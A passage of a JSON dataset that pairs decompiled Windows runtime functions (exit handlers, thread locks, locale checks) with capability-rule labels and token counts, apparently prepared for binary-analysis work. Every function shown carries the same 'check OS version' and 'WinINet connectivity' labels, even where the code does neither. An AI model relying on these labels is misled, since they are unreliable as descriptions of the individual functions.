        "decompiled_code": "\nvoid __cdecl fcn.0040a730(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    code *var_dch;\n    uint var_1ch;\n    code *var_14h;\n    code *var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.0040a730::var_1ch;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    if (*0x41955c == NULL) {\n        uVar1 = fcn.0040e020(\"__setusermatherr\");\n        (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        var_8h = fcn.004114b0();\n        var_dch = var_8h;\n        if (var_8h == NULL) {\n            var_dch = 0xffffffff;\n        }\n        *0x41955c = var_dch;\n    }\n    if (*0x41955c == 0xffffffff) {\n        var_dch = NULL;\n    }\n    else {\n        var_dch = *0x41955c;\n    }\n    var_14h = var_dch;\n    if (var_dch != NULL) {\n        (*var_dch)(arg_8h);\n        fcn.004114b0();\n    }\n    *0x419558 = fcn.0040a6b0(arg_8h);\n    uStack8 = 0x40a807;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 378
    },
    "0040a970": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a970(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_2ch;\n    uint var_20h;\n    int32_t var_10h;\n    code *pcStack16;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xfffffffe;\n    var_8h = 0x4178b8;\n    pcStack16 = fcn.004115d0;\n    var_10h = *in_FS_OFFSET;\n    puVar2 = &fcn.0040a970::var_3ch;\n    for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = var_8h ^ *0x41900c;\n    arg_8h_00 = *0x41900c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0040a970::var_10h;\n    var_20h = 0;\n    (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    var_2ch = fcn.004114b0();\n    while( true ) {\n        var_38h = 0;\n        LOCK();\n        if (*arg_8h == 0) {\n            *arg_8h = var_2ch;\n        }\n        else {\n            var_38h = *arg_8h;\n        }\n        if ((var_38h == 0) || (var_38h == var_2ch)) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        fcn.004114b0();\n    }\n    var_4h = 0;\n    var_20h = fcn.0040aba0();\n    var_4h = 0xfffffffe;\n    fcn.0040aa23(arg_8h_00);\n    fcn.00411450(var_20h, extraout_EDX);\n    *in_FS_OFFSET = var_10h;\n    var_4h = 0x40aa60;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 557
    },
    "0040aa23": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aa23(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    uint var_38h;\n    \n    if (*(unaff_EBP + -0x38) == 0) {\n        **(unaff_EBP + 8) = 0;\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "0040aba0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040aba0(int32_t **param_1)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t uStack276;\n    uint var_100h;\n    uint var_e9h;\n    uint auStack68 [8];\n    int32_t **var_40h;\n    uchar *puStack28;\n    int32_t var_10h_2;\n    code *pcStack16;\n    uint32_t uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x417898;\n    pcStack16 = fcn.004052d0;\n    var_10h_2 = *in_FS_OFFSET;\n    puVar4 = &stack0xffffffbc;\n    for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    uStack12 = uStack12 ^ *0x41900c;\n    uStack276 = *0x41900c ^ &stack0xfffffffc;\n    puStack28 = &stack0xfffffeec;\n    *in_FS_OFFSET = &fcn.0040aba0::var_10h_2;\n    var_40h = param_1;\n    puVar1 = &stack0xfffffeec;\n    if (*0x41956c == '\\0') {\n        *0x419560 = 1;\n        var_4h = 0;\n        if (**param_1 == 0) {\n            puStack28 = &stack0xfffffeec;\n            fcn.0040ad30(0);\n            iVar3 = fcn.0040a930();\n            if (*0x419564 != iVar3) {\n                pcVar2 = fcn.0040aa80(*0x419564);\n                (*pcVar2)(0, 0, 0);\n                fcn.004114b0();\n            }\n            fcn.0040bc00(0x41957c);\n            puVar1 = puStack28;\n        }\n        else {\n            puVar1 = &stack0xfffffeec;\n            if (**param_1 == 1) {\n                fcn.0040bc00(0x419588);\n                puVar1 = puStack28;\n            }\n        }\n        puStack28 = puVar1;\n        var_4h = 0xfffffffe;\n        if (**var_40h == 0) {\n            sub.msvcrt.dll__initterm(0x4131c0, 0x4131c4);\n        }\n        sub.msvcrt.dll__initterm(0x4131c8, 0x4131cc);\n        puVar1 = puStack28;\n        if (*var_40h[1] == 0) {\n            *0x41956c = '\\x01';\n            *var_40h[2] = 1;\n        }\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = var_10h_2;\n    var_4h = 0x40ad26;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 743
    },
    "0040ae50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ae50(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint arg_ch_00;\n    int32_t iVar3;\n    uint extraout_EDX;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    ulong uVar5;\n    uint var_e8h;\n    uint var_2ch;\n    uint var_11h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x412790;\n    var_ch = *in_FS_OFFSET;\n    puVar4 = &fcn.0040ae50::var_2ch;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    uVar2 = *0x41900c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0040ae50::var_ch;\n    if (arg_10h == 0) {\n        cVar1 = fcn.0040b000(uVar2);\n        if (cVar1 != '\\0') {\n            fcn.0040b140(arg_8h);\n        }\n    }\n    var_11h._0_1_ = 0;\n    arg_ch_00 = fcn.0040ab20(&fcn.0040ae50::arg_ch, &fcn.0040ae50::arg_10h, &fcn.0040ae50::var_11h);\n    fcn.0040a970(0x419568, arg_ch_00);\n    uVar5 = CONCAT44(extraout_EDX, var_11h);\n    if (var_11h != 0) {\n        uVar5 = fcn.00404800(1, 1);\n    }\n    if (arg_10h == 0) {\n        uVar5 = fcn.0040af60(arg_8h);\n    }\n    fcn.00411450(uVar5);\n    *in_FS_OFFSET = var_ch;\n    stack0xffffffec = 0x40af23;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 535
    },
    "0040b000": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040b000(void)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_8h;\n    \n    puVar3 = &fcn.0040b000::var_18h;\n    for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    piVar1 = fcn.004114b0();\n    if ((piVar1 != NULL) && (*piVar1 == 0x5a4d)) {\n        var_14h = piVar1 + *(piVar1 + 0x1e);\n    }\n    var_8h = 0x40b0ae;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 231
    },
    "0040b140": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b140(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    ulong uVar5;\n    char *lpProcName;\n    uint var_e8h;\n    uint var_28h;\n    code *var_20h;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4127b0;\n    var_ch = *in_FS_OFFSET;\n    puVar4 = &fcn.0040b140::var_28h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    uVar1 = *0x41900c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0040b140::var_ch;\n    uVar2 = fcn.00405830(uVar1);\n    fcn.00405380(uVar2);\n    uVar2 = fcn.0040afe0();\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleExW)(0, L\"mscoree.dll\", uVar2);\n    iVar3 = fcn.004114b0();\n    if (iVar3 == 0) {\n        uVar5 = fcn.0040ab60();\n    }\n    else {\n        lpProcName = \"CorExitProcess\";\n        uVar2 = fcn.00405460();\n        var_20h = fcn.0040aad0(uVar2, lpProcName);\n        if (var_20h == NULL) {\n            uVar5 = fcn.0040ab60();\n        }\n        else {\n            (*var_20h)(arg_8h);\n            fcn.004114b0();\n            uVar5 = fcn.0040ab60();\n        }\n    }\n    fcn.00411450(uVar5);\n    *in_FS_OFFSET = var_ch;\n    var_14h = 0x40b22e;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 516
    },
    "0040b400": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040b4b5)\n\nvoid __cdecl fcn.0040b400(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint var_f4h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_20h;\n    uint32_t *var_14h;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040b400::var_34h;\n    for (iVar3 = 0xd; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = fcn.004056d0();\n    var_14h = var_8h + 0x70;\n    if ((*var_14h & 2) == 0) {\n        var_f4h = 2;\n    }\n    else {\n        var_f4h = 1;\n    }\n    var_20h = var_f4h;\n    if (arg_8h + 1U < 4) {\n    // switch table (4 cases) at 0x40b554\n        switch(*((arg_8h + 1U) * 4 + 0x40b554)) {\n        case 0x40b483:\n            *var_14h = *var_14h | 2;\n            break;\n        case 0x40b495:\n            *var_14h = *var_14h & 0xfffffffd;\n            break;\n        case 0x40b4a7:\n            break;\n        case 0x40b4ac:\n        }\n    }\n    else {\n        var_2ch = 0;\n        iVar3 = fcn.00405830(2, L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\ucrtbase.msvcrt\\\\setlocal_thunks.cpp\", *0x41901c + 0x31, 0, \n                             0x41322c, L\"(\\\"Invalid parameter for _configthreadlocale\\\", 0)\");\n        if (iVar3 == 1) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (var_2ch == 0) {\n            puVar2 = sub.msvcrt.dll__errno();\n            *puVar2 = 0x16;\n            fcn.00405a50(L\"(\\\"Invalid parameter for _configthreadlocale\\\", 0)\", L\"_configthreadlocale\", \n                         L\"D:\\\\a\\\\VC-LTL5\\\\VC-LTL5\\\\ucrtbase.msvcrt\\\\setlocal_thunks.cpp\", *0x41901c + 0x31, 0);\n        }\n    }\n    uStack8 = 0x40b54f;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 671
    },
    "0040b570": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b570(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_2ch;\n    uint var_20h;\n    int32_t var_10h;\n    code *pcStack16;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xfffffffe;\n    var_8h = 0x4178f8;\n    pcStack16 = fcn.004115d0;\n    var_10h = *in_FS_OFFSET;\n    puVar2 = &fcn.0040b570::var_3ch;\n    for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = var_8h ^ *0x41900c;\n    arg_8h_00 = *0x41900c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0040b570::var_10h;\n    var_20h = 0;\n    (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    var_2ch = fcn.004114b0();\n    while( true ) {\n        var_38h = 0;\n        LOCK();\n        if (*arg_8h == 0) {\n            *arg_8h = var_2ch;\n        }\n        else {\n            var_38h = *arg_8h;\n        }\n        if ((var_38h == 0) || (var_38h == var_2ch)) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        fcn.004114b0();\n    }\n    var_4h = 0;\n    var_20h = fcn.0040b7c0();\n    var_4h = 0xfffffffe;\n    fcn.0040b623(arg_8h_00);\n    fcn.00411450(var_20h, extraout_EDX);\n    *in_FS_OFFSET = var_10h;\n    var_4h = 0x40b660;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 559
    },
    "0040b623": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b623(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    uint var_38h;\n    \n    if (*(unaff_EBP + -0x38) == 0) {\n        **(unaff_EBP + 8) = 0;\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "0040b680": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b680(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_2ch;\n    uint var_20h;\n    int32_t var_10h;\n    code *pcStack16;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xfffffffe;\n    var_8h = 0x4178d8;\n    pcStack16 = fcn.004115d0;\n    var_10h = *in_FS_OFFSET;\n    puVar2 = &fcn.0040b680::var_3ch;\n    for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = var_8h ^ *0x41900c;\n    arg_8h_00 = *0x41900c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0040b680::var_10h;\n    var_20h = 0;\n    (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    var_2ch = fcn.004114b0();\n    while( true ) {\n        var_38h = 0;\n        LOCK();\n        if (*arg_8h == 0) {\n            *arg_8h = var_2ch;\n        }\n        else {\n            var_38h = *arg_8h;\n        }\n        if ((var_38h == 0) || (var_38h == var_2ch)) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        fcn.004114b0();\n    }\n    var_4h = 0;\n    var_20h = fcn.0040b950();\n    var_4h = 0xfffffffe;\n    fcn.0040b733(arg_8h_00);\n    fcn.00411450(var_20h, extraout_EDX);\n    *in_FS_OFFSET = var_10h;\n    var_4h = 0x40b770;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 557
    },
    "0040b733": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b733(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    uint var_38h;\n    \n    if (*(unaff_EBP + -0x38) == 0) {\n        **(unaff_EBP + 8) = 0;\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "0040b7c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b7c0(int32_t **param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_149h;\n    uint var_13dh;\n    uint var_90h;\n    uint var_74h;\n    int32_t *var_68h;\n    int32_t *var_5ch;\n    code *var_50h;\n    int32_t *var_44h;\n    int32_t *var_38h;\n    int32_t var_2ch;\n    int32_t *var_20h;\n    int32_t *ptr;\n    int32_t **var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040b7c0::var_90h;\n    for (iVar1 = 0x24; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    ptr = fcn.0040aa80(***param_1);\n    var_20h = fcn.0040aa80(*(**var_8h + 4));\n    if ((ptr != NULL) && (ptr != 0xffffffff)) {\n        fcn.0040ad30(0);\n        var_2ch = fcn.0040a930();\n        var_38h = ptr;\n        var_44h = var_20h;\ncode_r0x0040b84b:\n        var_20h = var_20h + -1;\n        if (ptr <= var_20h) goto code_r0x0040b85c;\n        goto code_r0x0040b868;\n    }\ncode_r0x0040b93c:\n    uStack8 = 0x40b94c;\n    fcn.004114b0();\n    return;\ncode_r0x0040b85c:\n    if (*var_20h == var_2ch) goto code_r0x0040b84b;\ncode_r0x0040b868:\n    if (ptr <= var_20h) {\n        var_50h = fcn.0040aa80(*var_20h);\n        *var_20h = var_2ch;\n        (*var_50h)();\n        fcn.004114b0();\n        var_5ch = fcn.0040aa80(***var_8h);\n        var_68h = fcn.0040aa80(*(**var_8h + 4));\n        if ((var_5ch != var_38h) || (var_68h != var_44h)) {\n            var_38h = var_5ch;\n            ptr = var_5ch;\n            var_44h = var_68h;\n            var_20h = var_68h;\n        }\n        goto code_r0x0040b84b;\n    }\n    if (ptr != 0xffffffff) {\n        sub.msvcrt.dll_free(ptr, 2);\n    }\n    fcn.0040ad30(0);\n    var_74h = fcn.0040a930();\n    ***var_8h = var_74h;\n    *(**var_8h + 4) = var_74h;\n    goto code_r0x0040b93c;\n}\n",
        "token_count": 748
    },
    "0040b950": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b950(int32_t **param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *var_160h;\n    uint var_155h;\n    uint var_14ch;\n    uint var_140h;\n    uint var_a0h;\n    uint *var_74h;\n    uint var_68h;\n    int32_t var_5ch;\n    uint32_t var_50h;\n    uint32_t var_44h;\n    uint32_t var_38h;\n    uint *var_2ch;\n    uint *var_20h;\n    int32_t var_14h;\n    int32_t **var_8h;\n    \n    puVar4 = &fcn.0040b950::var_a0h;\n    for (iVar3 = 0x28; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    var_8h = param_1;\n    var_14h = fcn.0040aa80(***param_1);\n    var_20h = fcn.0040aa80(*(**var_8h + 4));\n    if (var_14h == 0) {\n        var_160h = NULL;\n    }\n    else {\n        uVar1 = sub.msvcrt.dll__msize(var_14h);\n        var_160h = var_14h + (uVar1 & 0xfffffffc);\n    }\n    var_2ch = var_160h;\n    if (var_20h == var_160h) {\n        var_38h = var_160h - var_14h >> 2;\n        var_160h = var_38h;\n        if (0x200 < var_38h) {\n            var_160h = 0x200;\n        }\n        var_44h = var_160h;\n        var_50h = var_38h + var_160h;\n        if (var_50h == 0) {\n            var_50h = 0x20;\n        }\n        var_5ch = 0;\n        if (var_38h <= var_50h) {\n            uVar2 = fcn.00410cc0(var_14h, var_50h, 4);\n            fcn.00405380(uVar2);\n            var_5ch = fcn.00405430();\n            fcn.00407080();\n        }\n        if (var_5ch == 0) {\n            var_50h = var_38h + 4;\n            uVar2 = fcn.00410cc0(var_14h, var_50h, 4);\n            fcn.00405380(uVar2);\n            var_5ch = fcn.00405430();\n            fcn.00407080();\n        }\n        if (var_5ch == 0) goto code_r0x0040bba0;\n        var_14h = var_5ch;\n        var_20h = var_5ch + var_38h * 4;\n        var_2ch = var_5ch + var_50h * 4;\n        fcn.0040ad30(0);\n        var_68h = fcn.0040a930();\n        for (var_74h = var_20h; var_74h != var_2ch; var_74h = var_74h + 1) {\n            *var_74h = var_68h;\n        }\n    }\n    uVar2 = fcn.0040a6b0(*var_8h[1]);\n    *var_20h = uVar2;\n    var_20h = var_20h + 1;\n    uVar2 = fcn.0040a6b0(var_14h);\n    ***var_8h = uVar2;\n    uVar2 = fcn.0040a6b0(var_20h);\n    *(**var_8h + 4) = uVar2;\ncode_r0x0040bba0:\n    var_8h = 0x40bbb0;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 957
    },
    "0040bc00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bc00(int32_t arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_c8h;\n    uint var_14h;\n    uint uStack12;\n    \n    puVar2 = &fcn.0040bc00::var_14h;\n    for (iVar1 = 5; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (arg_8h != 0) {\n        arg_ch = fcn.00405380(&fcn.0040bc00::arg_8h);\n        fcn.0040b570(arg_8h + 8, arg_ch);\n    }\n    uStack12 = 0x40bc6d;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 225
    },
    "0040bc80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bc80(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d1h;\n    uint var_18h;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040bc80::var_18h;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if ((arg_8h != NULL) && (*arg_8h == arg_8h[2])) {\n        fcn.0040ad30(0);\n        var_8h = fcn.0040a930();\n        *arg_8h = var_8h;\n        arg_8h[1] = var_8h;\n        arg_8h[2] = 0;\n    }\n    uStack8 = 0x40bd02;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 249
    },
    "0040bd10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd10(int32_t arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_cch;\n    uint var_18h;\n    uint uStack16;\n    \n    puVar2 = &fcn.0040bd10::var_18h;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (arg_8h != 0) {\n        arg_ch_00 = fcn.0040b790(&fcn.0040bd10::arg_8h, &fcn.0040bd10::arg_ch);\n        fcn.0040b680(arg_8h + 8, arg_ch_00);\n    }\n    uStack16 = 0x40bd81;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 245
    },
    "0040c970": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040c970(uint *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint32_t arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, uint arg_24h, uint arg_28h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    ulong uVar3;\n    uint32_t var_11ch;\n    uint32_t var_118h;\n    uint32_t var_114h;\n    uint32_t var_110h;\n    int32_t var_10ch;\n    uint32_t var_108h;\n    uint var_5ch;\n    int32_t var_40h;\n    uint32_t var_34h;\n    int32_t var_28h;\n    int32_t var_1ch;\n    int32_t var_10h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040c970::var_5ch;\n    for (iVar1 = 0x17; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_1ch = arg_1ch + 1;\n    var_28h = arg_1ch + 2;\n    if (arg_1ch + 3U < arg_18h) {\n        var_108h = arg_1ch + 3;\n    }\n    else {\n        var_108h = arg_18h;\n    }\n    var_34h = var_108h;\n    fcn.00410790(*arg_8h, arg_8h[1], var_1ch, &fcn.0040c970::var_10h, arg_14h, var_108h);\n    if (arg_10h == -1) {\n        var_10ch = arg_10h;\n    }\n    else {\n        var_110h = var_10h == 0x2d;\n        var_114h = 0 < arg_1ch;\n        var_10ch = (arg_10h - var_110h) - var_114h;\n    }\n    var_118h = var_10h == 0x2d;\n    var_11ch = 0 < arg_1ch;\n    iVar1 = fcn.0040e360(arg_ch + var_11ch + var_118h, var_10ch, arg_1ch + 1, &fcn.0040c970::var_10h);\n    var_40h = iVar1;\n    if (iVar1 == 0) {\n        uVar3 = fcn.0040cb40(arg_ch, arg_10h, arg_1ch, arg_20h & 0xff, arg_24h, &fcn.0040c970::var_10h, 0, arg_28h);\n        arg_ch = uVar3 >> 0x20;\n        iVar1 = uVar3;\n    }\n    else {\n        *arg_ch = 0;\n    }\n    fcn.00411450(iVar1, arg_ch);\n    uStack8 = 0x40cb1b;\n    fcn.004114b0();\n    return;\n}\n",
